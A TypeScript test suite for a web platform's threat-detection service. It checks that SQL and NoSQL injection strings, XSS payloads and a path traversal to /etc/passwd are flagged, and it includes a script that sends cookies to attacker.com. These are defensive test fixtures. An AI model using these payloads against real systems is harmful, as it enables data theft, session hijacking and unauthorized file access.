// ─────────────────────────────────────────────────────────────────────────────
//  tests/realtime-threat-detection.test.ts
//  FlareBase — Real-Time High-Performance Threat Detection & Security Shield
// ─────────────────────────────────────────────────────────────────────────────

import "dotenv/config";
process.env.JWT_SECRET = process.env.JWT_SECRET || "a-very-long-secret-key-at-least-32-characters-for-testing-purpose!";
process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "a-very-long-encryption-key-32-bytes-long!";
process.env.RECOVERY_PIN = process.env.RECOVERY_PIN || "948201";

import { initSqlite, getDb } from '../src/db/sqlite.connection';
import { threatDetectionService } from '../src/services/threat-detection.service';
import { wsService } from '../src/realtime/websocket.service';

let passed = 0;
let failed = 0;

function assert(condition: boolean, description: string): void {
  if (condition) {
    console.log(`  ✅ PASS: ${description}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${description}`);
    failed++;
  }
}

async function runRealtimeThreatDetectionTests(): Promise<void> {
  console.log('\n================================================================');
  console.log('🛡️  Running FlareBase Real-Time Threat Intelligence Test Suite');
  console.log('================================================================\n');

  initSqlite();
  const db = getDb();

  // ───────────────────────────────────────────────────────────────────────────
  //  TEST 1: SQL / NoSQL Injection Real-Time Inspection
  // ───────────────────────────────────────────────────────────────────────────
  console.log('--- 1. SQL & NoSQL Injection Real-Time Detection ---');

  const cleanReq = {
    url: '/api/v1/db/collections/orders/documents',
    query: { status: 'completed', page: '1' },
    body: { item: 'Laptop', price: 999 }
  };
  const cleanResult = threatDetectionService.inspectProjectRequest(cleanReq);
  assert(cleanResult.riskScore === 0, 'Clean CRUD payload returns 0 risk score');
  assert(cleanResult.isFlagged === false, 'Clean payload is not flagged');

  const nosqlWhereReq = {
    url: '/api/v1/db/collections/users/documents',
    query: { '$where:': 'this.password.length > 0' },
    body: {}
  };
  const nosqlResult = threatDetectionService.inspectProjectRequest(nosqlWhereReq);
  assert(nosqlResult.riskScore >= 70, `NoSQL $where injection flagged (Score: ${nosqlResult.riskScore}/100)`);
  assert(nosqlResult.threatCategory === 'sql_nosql_injection', 'Threat categorized as sql_nosql_injection');

  const sqlUnionReq = {
    url: '/api/v1/db/collections/items/documents?filter=1',
    query: {},
    body: { search: "test' UNION SELECT * FROM users --" }
  };
  const sqlUnionResult = threatDetectionService.inspectProjectRequest(sqlUnionReq);
  assert(sqlUnionResult.riskScore >= 70, `SQL UNION SELECT injection flagged (Score: ${sqlUnionResult.riskScore}/100)`);
  assert(sqlUnionResult.threatCategory === 'sql_nosql_injection', 'Threat categorized as sql_nosql_injection');

  const sqlOr1Req = {
    url: '/api/v1/db/collections/items/documents',
    query: { q: "' OR 1=1 --" },
    body: {}
  };
  const sqlOr1Result = threatDetectionService.inspectProjectRequest(sqlOr1Req);
  assert(sqlOr1Result.riskScore >= 70, `' OR 1=1 tautology injection flagged (Score: ${sqlOr1Result.riskScore}/100)`);

  // ───────────────────────────────────────────────────────────────────────────
  //  TEST 2: XSS & Malicious Script Payload Inspection
  // ───────────────────────────────────────────────────────────────────────────
  console.log('\n--- 2. XSS & Malicious Executable Script Payloads ---');

  const xssScriptReq = {
    url: '/api/v1/db/collections/comments/documents',
    body: { message: '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script>' }
  };
  const xssResult = threatDetectionService.inspectProjectRequest(xssScriptReq);
  assert(xssResult.riskScore >= 70, `XSS script injection flagged (Score: ${xssResult.riskScore}/100)`);
  assert(xssResult.threatCategory === 'xss_malicious_payload', 'Threat categorized as xss_malicious_payload');

  const xssImgReq = {
    url: '/api/v1/db/collections/posts/documents',
    body: { content: '<img src="x" onerror="alert(1)" />' }
  };
  const xssImgResult = threatDetectionService.inspectProjectRequest(xssImgReq);
  assert(xssImgResult.riskScore >= 70, `XSS onerror handler injection flagged (Score: ${xssImgResult.riskScore}/100)`);

  // ───────────────────────────────────────────────────────────────────────────
  //  TEST 3: Path Traversal & Directory Escape Detection
  // ───────────────────────────────────────────────────────────────────────────
  console.log('\n--- 3. Path Traversal & Directory Escape Detection ---');

  const pathTraversalReq = {
    url: '/api/v1/storage/assets/../../../../etc/passwd',
    body: {}
  };
  const pathResult = threatDetectionService.inspectProjectRequest(pathTraversalReq);
  assert(pathResult.riskScore >= 70, `Path traversal directory escape flagged (Score: ${pathResult.riskScore}/100)`);
  assert(pathResult.threatCategory === 'path_traversal_probe', 'Threat categorized as path_traversal_probe');

  // ───────────────────────────────────────────────────────────────────────────
  //  TEST 4: Sub-Millisecond High-Throughput Performance Benchmark
  // ───────────────────────────────────────────────────────────────────────────
  console.log('\n--- 4. Sub-Millisecond Zero-Latency Overhead Benchmark ---');

  const benchIterations = 1000;
  const start = process.hrtime.bigint();
  for (let i = 0; i < benchIterations; i++) {
    threatDetectionService.inspectProjectRequest({
      url: `/api/v1/db/collections/products/documents/${i}`,
      query: { limit: '20', offset: '0' },
      body: { name: `Product ${i}`, price: i * 10, inStock: true }
    });
  }
  const end = process.hrtime.bigint();
  const totalMs = Number(end - start) / 1_000_000;
  const avgMs = totalMs / benchIterations;

  console.log(`  ⚡ Scanned ${benchIterations} payloads in ${totalMs.toFixed(2)}ms (Avg: ${avgMs.toFixed(4)}ms/req)`);
  assert(avgMs < 0.1, `Average inspection latency (${avgMs.toFixed(4)}ms) is strictly under 0.1ms`);

  // ───────────────────────────────────────────────────────────────────────────
  //  TEST 5: Automated Account Quarantine & Real-Time WebSocket Alerts
  // ───────────────────────────────────────────────────────────────────────────
  console.log('\n--- 5. Automated Account Quarantine & WebSocket Notifications ---');

  const testBadUserId = `bad_actor_${Date.now()}`;
  const testBadUserEmail = `attacker_${Date.now()}@exploit.net`;

  db.prepare(`
    INSERT INTO users (id, email, emailHash, name, passwordHash, isSuperAdmin, createdAt, updatedAt)
    VALUES (?, ?, ?, 'Bad Actor', 'hash', 0, datetime('now'), datetime('now'))
  `).run(testBadUserId, testBadUserEmail, `hash_${testBadUserId}`);

  // Track WebSocket broadcasts
  const wsAlertState = { received: false, payload: null as any };

  const originalBroadcast = wsService.broadcast;
  wsService.broadcast = (event: string, data: any) => {
    if (event === 'SECURITY_ALERT_FLAGGED') {
      wsAlertState.received = true;
      wsAlertState.payload = data;
    }
  };

  const threatResult = await threatDetectionService.evaluateThreat({
    userId: testBadUserId,
    userEmail: testBadUserEmail,
    ipAddress: '198.51.100.99',
    eventType: 'malicious_payload_probe',
    payload: { query: 'UNION SELECT * FROM platform_settings' }
  });

  assert(threatResult.isFlagged === true, 'Malicious actor flagged automatically');
  assert(threatResult.riskScore >= 70, `Risk score marked high/critical (${threatResult.riskScore}/100)`);
  assert(wsAlertState.received === true, 'Real-time WebSocket SECURITY_ALERT_FLAGGED broadcast dispatched to Super Admin');
  assert(wsAlertState.payload?.flag?.userEmail === testBadUserEmail, 'Alert payload identifies correct compromised account');

  const dbFlag = db.prepare("SELECT * FROM account_security_flags WHERE userId = ? AND status = 'active'").get(testBadUserId) as any;
  assert(!!dbFlag, 'Security flag record saved in SQLite');
  assert(dbFlag.severity === 'high' || dbFlag.severity === 'critical', 'Security flag severity marked high/critical');

  // Restore original broadcast
  wsService.broadcast = originalBroadcast;

  // ───────────────────────────────────────────────────────────────────────────
  //  SUMMARY
  // ───────────────────────────────────────────────────────────────────────────
  console.log('\n================================================================');
  console.log(`🏁 Real-Time Threat Detection Test Results: ${passed} Passed, ${failed} Failed`);
  console.log('================================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
  process.exit(0);
}

runRealtimeThreatDetectionTests().catch(err => {
  console.error('Test runner fatal error:', err);
  process.exit(1);
});
